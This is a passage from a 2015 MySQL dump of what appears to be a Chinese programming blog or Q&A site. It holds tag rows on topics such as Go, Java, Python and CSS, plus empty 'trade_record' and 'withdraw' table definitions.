5,'20150603104120',2,'操作系统判断',0,0),(46,'20150603104120',2,'javacv',0,0),(47,'20150603104120',2,'摄像头',0,0),(48,'20150603104120',2,'分辨率',0,0),(49,'20150603104120',2,'图像处理',0,0),(50,'20150603104120',2,'c语言',0,0),(51,'20150604171602',2,'的产品及服务',0,0),(52,'20150604171639',2,'接私活',0,0),(53,'20150604172013',2,'nio',0,0),(54,'20150605183030',2,'入门',1,0),(55,'20150605195311',2,'string',0,0),(56,'20150605195311',2,'javascript',0,0),(57,'20150605195311',2,'class',0,0),(58,'20150605195416',2,'比较',0,0),(59,'20150608080647',2,'go',1,0),(60,'20150608080647',2,'陷阱',0,0),(61,'20150608080927',2,'获取ip',0,0),(62,'20150608081325',2,'代码注释',0,0),(63,'20150608081927',2,'odbc',0,0),(64,'20150608081927',2,'jdbc',0,0),(65,'20150608082332',2,'java9',0,0),(66,'20150608082735',2,'java规范',0,0),(67,'20150608082735',2,'代码规范',0,0),(68,'20150608083125',2,'开源库',0,0),(69,'20150608083722',2,'change',0,0),(70,'20150608083722',2,'programming',0,0),(71,'20150608084400',2,'socket',0,0),(72,'20150608084400',2,'scalable ',0,0),(73,'20150613213118',2,'SDL',0,0),(74,'20150613213118',2,'游戏',0,0),(75,'20150613213118',2,'教程',0,0),(76,'20150613215133',2,'mingw32',0,0),(77,'20150613215133',2,'环境配置',0,0),(78,'20150613215332',2,'图片',0,0),(79,'20150613215614',2,'键盘',0,0),(80,'20150613220055',2,'c++',0,0),(81,'20150613220055',2,'封装',0,0),(82,'20150613220610',2,'sdl 图片',0,0),(83,'20150613220652',2,'日志',0,0),(84,'20150613220907',2,'旋转',0,0),(85,'20150613220907',2,'缩放',0,0),(86,'20150613221143',2,'vc',0,0),(87,'20150613221245',2,'vc8',0,0),(88,'20150613221245',2,'代码迁移',0,0),(89,'20150613221522',2,'场景',0,0),(90,'20150613221735',2,'总结',0,0),(91,'20150617085051',2,'介绍',0,0),(92,'20150617090525',1,'Go语言',0,0),(93,'20150617090525',1,'    环境设置 ',0,0),(94,'20150617090525',1,'   环境',0,0),(95,'20150617090525',1,'    设置',0,0),(96,'20150617091034',1,'系列教程',0,0),(97,'20150617091034',1,'程序结构',0,0),(98,'20150617091209',1,'    基本语法    ',0,0),(99,'20150617091310',1,'数据类型',0,0),(100,'20150617091658',1,'变量',0,0),(101,'20150617091948',1,'常量',0,0),(102,'20150617092404',1,'运算符',0,0),(103,'20150617092547',1,'if',0,0),(104,'20150617092640',1,'for语法',0,0),(105,'20150617092930',1,'function',0,0),(106,'20150617093322',1,'范围规则',0,0),(107,'20150617093716',1,'数组',0,0),(108,'20150617094509',1,'指针',0,0),(109,'20150617094833',1,'结构',0,0),(110,'20150617095032',1,'切片',0,0),(111,'20150617095218',1,'范围',0,0),(112,'20150617095218',1,'range',0,0),(113,'20150617095218',1,'golang',1,0),(114,'20150617095346',1,'映射',0,0),(115,'20150617095507',1,'递归',0,0),(116,'20150617095628',1,'类型转换',0,0),(117,'20150617095813',1,'接口',0,0),(118,'20150617095930',1,'错误处理',0,0),(119,'20150618172821',2,'XSS',0,0),(120,'20150618172821',2,'攻击',0,0),(121,'20150618172821',2,'防御',0,0),(122,'20150619085706',1,'python',1,0),(123,'20150619085919',1,'概述',0,0),(124,'20150619090028',1,'Python环境安装',0,0),(125,'20150619090227',1,'python基本语法',0,0),(126,'20150619100548',2,'django',0,0),(127,'20150627224456',14,'字符串 指针 c oc ',0,0),(128,'20150702115251',15,'apache',0,0),(129,'20150702115251',15,'virtualhost',0,0),(130,'20150712123340',2,'对象',0,0),(131,'20150712124229',2,'日期',0,0),(132,'20150712124229',2,'格式化',0,0),(133,'20150712125437',2,'地址',0,0),(134,'20150712125556',2,'页面跳转',0,0),(135,'20150712130746',2,' html5',0,0),(136,'20150712130746',2,'文件API  ',0,0),(137,'20150712131601',2,'正则表达式',0,0),(138,'20150712132637',2,'jquery',0,0),(139,'20150712132637',2,'select',0,0),(140,'20150712133816',2,'checkbox',0,0),(141,'20150712134728',2,'radio',0,0),(142,'20150713072115',2,'css ',0,0),(143,'20150713072115',2,'margin ',0,0),(144,'20150713072115',2,'padding ',0,0),(145,'20150713072214',2,'position ',0,0),(146,'20150713072342',2,'居中 ',0,0),(147,'20150713080103',2,'float ',0,0),(148,'20150713080401',2,'clear',0,0),(149,'20150713080525',2,'both',0,0),(150,'20150715212438',2,'iPhone',0,0),(151,'20150715212438',2,'iOS',0,0),(152,'20150908005847',2,'java8',0,0),(153,'20150909043244',2,'ide推荐',0,0),(154,'20150909043446',2,'webframework',0,0),(155,'20150909043446',2,'web框架',0,0),(156,'20150921001940',2,'创业',1,0),(157,'20150921004932',2,'历史',0,0);
/*!40000 ALTER TABLE `sys_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `trade_record`
--

DROP TABLE IF EXISTS `trade_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `trade_record` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `create_date` varchar(255) NOT NULL,
  `money` double NOT NULL,
  `obj_id` bigint(20) NOT NULL,
  `type` int(11) NOT NULL,
  `obj_type` int(11) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `record_type` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_2k2q3qmdl5xdh40wrn7pfobgs` (`user_id`),
  KEY `FKAA72DF8C8C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `trade_record`
--

LOCK TABLES `trade_record` WRITE;
/*!40000 ALTER TABLE `trade_record` DISABLE KEYS */;
/*!40000 ALTER TABLE `trade_record` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `withdraw`
--

DROP TABLE IF EXISTS `withdraw`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `withdraw` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `comments` varchar(255) DEFAULT NULL,
  `create_date` varchar(255) NOT NULL,
  `money` double NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `pay_account` varchar(255) NOT NULL,
  `allow_date` varchar(255) DEFAULT NULL,
  `true_money` double NOT NULL,
  `w_state` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_n69t3o8xq6bss50d5109vrdkc` (`user_id`),
  KEY `FKC7F50B0A8C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `withdraw`
--

LOCK TABLES `withdraw` WRITE;
/*!40000 ALTER TABLE `withdraw` DISABLE KEYS */;
/*!40000 ALTER TABLE `withdraw` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-09-21  5:01:16
